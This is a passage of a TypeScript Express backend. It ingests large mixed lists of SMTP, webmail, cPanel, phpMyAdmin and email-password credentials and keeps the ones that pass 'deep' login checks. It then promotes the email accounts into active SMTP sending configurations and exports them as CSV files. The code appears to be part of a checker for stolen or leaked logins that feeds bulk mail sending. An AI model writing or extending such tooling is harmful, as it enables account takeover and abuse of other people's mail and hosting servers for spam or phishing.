      if (webmailDeepValidItems.length) await webmailRepo.save(webmailDeepValidItems as any);
      if (cpanelDeepValidItems.length) await cpanelRepo.save(cpanelDeepValidItems as any);
      if (pmaDeepValidItems.length) await pmaRepo.save(pmaDeepValidItems as any);
      if (emailAccDeepValidItems.length) await emailAccRepo.save(emailAccDeepValidItems as any);
      if (emailAddrValidItems.length) await emailAddrRepo.save(emailAddrValidItems as any);
    }

    return res.json({
      success: true,
      stats: {
        smtp: acc.smtp.length,
        smtpValid: smtpValid.length,
        smtpInvalid: smtpInvalid.length,
        webmail: acc.webmail.length,
        webmailValid: webmailValid.length,
        webmailInvalid: webmailInvalid.length,
        webmailDeepValid,
        webmailDeepInvalid,
        cpanel: acc.cpanel.length,
        cpanelValid: cpanelValid.length,
        cpanelInvalid: cpanelInvalid.length,
        cpanelDeepValid,
        cpanelDeepInvalid,
        phpmyadmin: acc.phpmyadmin.length,
        phpmyadminValid: phpmyadminValid.length,
        phpmyadminInvalid: phpmyadminInvalid.length,
        phpmyadminDeepValid,
        phpmyadminDeepInvalid,
        emailPairs: acc.emailPairs.length,
        emailPairsValid: emailPairsValid.length,
        emailPairsInvalid: emailPairsInvalid.length,
        emailPairsDeepValid,
        emailPairsDeepInvalid,
        emails: acc.emails.length,
        emailsValid: emailsValid.length,
        emailsInvalid: emailsInvalid.length,
        unknown: acc.unknown.length
      },
      categories: {
        smtp: { valid: smtpValid, invalid: smtpInvalid.slice(0, 1000) },
        webmail: acc.webmail.slice(0, 1000),
        webmailValidated: { valid: webmailValid.slice(0, 1000), invalid: webmailInvalid.slice(0, 1000) },
        webmailDeep: {
          valid: acc.webmail.filter((_, i) => (webmailDeep[i] as any)?.ok).slice(0, 1000),
          invalid: acc.webmail.map((it, i) => ({ item: it, error: (webmailDeep[i] as any)?.error || 'auth failed' })).filter((_, i) => !(webmailDeep[i] as any)?.ok).slice(0, 1000)
        },
        cpanel: acc.cpanel.slice(0, 1000),
        cpanelValidated: { valid: cpanelValid.slice(0, 1000), invalid: cpanelInvalid.slice(0, 1000) },
        cpanelDeep: {
          valid: acc.cpanel.filter((_, i) => (cpanelDeep[i] as any)?.ok).slice(0, 1000),
          invalid: acc.cpanel.map((it, i) => ({ item: it, error: (cpanelDeep[i] as any)?.error || 'auth failed' })).filter((_, i) => !(cpanelDeep[i] as any)?.ok).slice(0, 1000)
        },
        phpmyadmin: acc.phpmyadmin.slice(0, 1000),
        phpmyadminValidated: { valid: phpmyadminValid.slice(0, 1000), invalid: phpmyadminInvalid.slice(0, 1000) },
        phpmyadminDeep: {
          valid: acc.phpmyadmin.filter((_, i) => (phpmyadminDeep[i] as any)?.ok).slice(0, 1000),
          invalid: acc.phpmyadmin.map((it, i) => ({ item: it, error: (phpmyadminDeep[i] as any)?.error || 'auth failed' })).filter((_, i) => !(phpmyadminDeep[i] as any)?.ok).slice(0, 1000)
        },
        emailPairs: acc.emailPairs.slice(0, 1000),
        emailPairsValidated: { valid: emailPairsValid.slice(0, 1000), invalid: emailPairsInvalid.slice(0, 1000) },
        emailPairsDeep: {
          valid: acc.emailPairs.map((it, i) => ({ email: it.email, host: (emailPairsDeep[i] as any)?.host })).filter((_, i) => (emailPairsDeep[i] as any)?.ok).slice(0, 1000),
          invalid: acc.emailPairs.map((it, i) => ({ email: it.email, error: (emailPairsDeep[i] as any)?.error || 'auth failed' })).filter((_, i) => !(emailPairsDeep[i] as any)?.ok).slice(0, 1000)
        },
        emails: acc.emails.slice(0, 5000),
        emailsValidated: { valid: emailsValid.slice(0, 5000), invalid: emailsInvalid.slice(0, 1000) },
        unknown: acc.unknown.slice(0, 1000)
      }
    });
  } catch (e: any) {
    return res.status(500).json({ success: false, error: e?.message || 'Ingest failed' });
  }
});

// Bulk delete invalid SMTPs by ids
router.post('/smtp/bulk-delete', authenticateJWT, async (req, res) => {
  try {
    const ids: string[] = Array.isArray(req.body?.ids) ? req.body.ids : [];
    if (ids.length === 0) return res.status(400).json({ success: false, error: 'ids[] required' });
    const repo = AppDataSource.getRepository(SmtpConfiguration);
    const toDelete = await repo.findByIds(ids as any);
    if (toDelete.length === 0) return res.json({ success: true, deleted: 0 });
    await repo.remove(toDelete);
    return res.json({ success: true, deleted: toDelete.length });
  } catch (e: any) {
    return res.status(500).json({ success: false, error: e?.message || 'Bulk delete failed' });
  }
});

// Bulk delete mixed by type
router.post('/mixed/bulk-delete', authenticateJWT, async (req, res) => {
  try {
    const { type, ids } = req.body || {};
    if (!Array.isArray(ids) || !type) return res.status(400).json({ success: false, error: 'type and ids[] required' });
    const map: any = {
      webmail: AppDataSource.getRepository(WebmailCredential),
      cpanel: AppDataSource.getRepository(CpanelCredential),
      phpmyadmin: AppDataSource.getRepository(PhpMyAdminCredential),
      emailAccounts: AppDataSource.getRepository(EmailAccount),
      emails: AppDataSource.getRepository(EmailAddress)
    };
    const repo = map[type];
    if (!repo) return res.status(400).json({ success: false, error: 'invalid type' });
    const toDelete = await repo.findByIds(ids as any);
    if (toDelete.length === 0) return res.json({ success: true, deleted: 0 });
    await repo.remove(toDelete);
    return res.json({ success: true, deleted: toDelete.length });
  } catch (e: any) {
    return res.status(500).json({ success: false, error: e?.message || 'Mixed bulk delete failed' });
  }
});

// List mixed credentials for current user
router.get('/mixed/webmail', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(WebmailCredential);
  const list = await repo.find({ where: { user: { id: req.user!.id } } as any, order: { createdAt: 'DESC' } });
  return res.json(list);
});
router.get('/mixed/cpanel', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(CpanelCredential);
  const list = await repo.find({ where: { user: { id: req.user!.id } } as any, order: { createdAt: 'DESC' } });
  return res.json(list);
});
router.get('/mixed/phpmyadmin', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(PhpMyAdminCredential);
  const list = await repo.find({ where: { user: { id: req.user!.id } } as any, order: { createdAt: 'DESC' } });
  return res.json(list);
});
router.get('/mixed/email-accounts', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(EmailAccount);
  const list = await repo.find({ where: { user: { id: req.user!.id } } as any, order: { createdAt: 'DESC' } });
  return res.json(list);
});
router.get('/mixed/emails', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(EmailAddress);
  const list = await repo.find({ where: { user: { id: req.user!.id } } as any, order: { createdAt: 'DESC' } });
  return res.json(list);
});

// Promote EmailAccount to SMTP configurations
router.post('/mixed/promote/email-accounts', authenticateJWT, async (req, res) => {
  try {
    const ids: string[] = Array.isArray(req.body?.ids) ? req.body.ids : [];
    if (ids.length === 0) return res.status(400).json({ success: false, error: 'ids[] required' });
    const emailAccRepo = AppDataSource.getRepository(EmailAccount);
    const smtpRepo = AppDataSource.getRepository(SmtpConfiguration);
    const accounts = await emailAccRepo.findByIds(ids as any);
    if (accounts.length === 0) return res.json({ success: true, created: 0 });

    const created: SmtpConfiguration[] = [] as any;
    for (const acc of accounts) {
      const email = acc.email;
      const domain = email.split('@')[1];
      let host = acc.authHost?.split(':')[0] || (domain ? `smtp.${domain}` : '');
      let port = parseInt(acc.authHost?.split(':')[1] || '587', 10);
      if (!host) continue;
      const secure = port === 465;
      const cfg = new SmtpConfiguration();
      cfg.userId = req.user!.id as any;
      cfg.name = `${email}`;
      cfg.providerType = 'smtp';
      cfg.host = host as any;
      cfg.port = port as any;
      cfg.username = email as any;
      cfg.password = acc.password as any;
      cfg.secure = secure as any;
      cfg.isActive = true as any;
      cfg.isValid = false as any;
      cfg.status = 'inactive' as any;
      const savedOne = await smtpRepo.save(cfg as any);
      created.push(savedOne as any);
    }
    return res.json({ success: true, created: created.length, configurations: created });
  } catch (e: any) {
    return res.status(500).json({ success: false, error: e?.message || 'Promote failed' });
  }
});

router.get('/smtp/export', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(SmtpConfiguration);
  const configs = await repo.find({ where: { userId: req.user!.id } as any, order: { createdAt: 'DESC' } });
  const lines = ['name,host,port,username,secure,isValid,status'];
  for (const c of configs) {
    lines.push(`${c.name||''},${c.host||''},${c.port||''},${c.username||''},${c.secure? 'true':'false'},${c.isValid? 'true':'false'},${c.status||''}`);
  }
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="smtp-configs.csv"');
  return res.send(lines.join('\n'));
});

router.get('/mixed/export', authenticateJWT, async (req, res) => {
  const type = (req.query.type as string) || 'webmail';
  const maps: any = {
    webmail: { repo: AppDataSource.getRepository(WebmailCredential), header: 'url,username,isValid' , line: (x: any)=> `${x.url},${x.username},${x.isValid?'true':'false'}` },
    cpanel: { repo: AppDataSource.getRepository(CpanelCredential), header: 'url,username,isValid' , line: (x: any)=> `${x.url},${x.username},${x.isValid?'true':'false'}` },
    phpmyadmin: { repo: AppDataSource.getRepository(PhpMyAdminCredential), header: 'url,username,isValid' , line: (x: any)=> `${x.url},${x.username},${x.isValid?'true':'false'}` },
    emailAccounts: { repo: AppDataSource.getRepository(EmailAccount), header: 'email,isValid,authHost' , line: (x: any)=> `${x.email},${x.isValid?'true':'false'},${x.authHost||''}` },
    emails: { repo: AppDataSource.getRepository(EmailAddress), header: 'email' , line: (x: any)=> `${x.email}` }
  };
  const item = maps[type];
  if (!item) return res.status(400).json({ success: false, error: 'invalid type' });
  const list = await item.repo.find({ where: { userId: req.user!.id } as any, order: { createdAt: 'DESC' } });
  const lines = [item.header];
  for (const x of list) lines.push(item.line(x));
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', `attachment; filename="${type}.csv"`);
  return res.send(lines.join('\n'));
});

export default router;
